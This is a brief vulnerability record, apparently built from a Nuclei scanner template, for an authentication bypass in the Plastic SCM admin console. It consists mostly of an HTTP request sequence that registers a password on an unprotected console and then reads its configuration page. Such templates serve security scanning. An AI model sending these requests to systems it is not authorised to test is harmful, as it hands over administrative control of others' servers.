# Vulnerability: Plastic Admin Console - Authentication Bypass
**Classification:** CWE-288
**Source:** Nuclei Template (`unauthorized-plastic-scm.yaml`)

## Description
A Plastic Admin console was discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /account/register HTTP/1.1
{{Hostname}}

POST /account/register HTTP/1.1
Host: {{Hostname}}
Origin: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/account/register
Connection: close

Password={{randstr}}&ConfirmPassword={{randstr}}&RememberMe=true&__RequestVerificationToken={{csrf}}&RememberMe=false

GET /configuration HTTP/1.1
{{Hostname}}
```

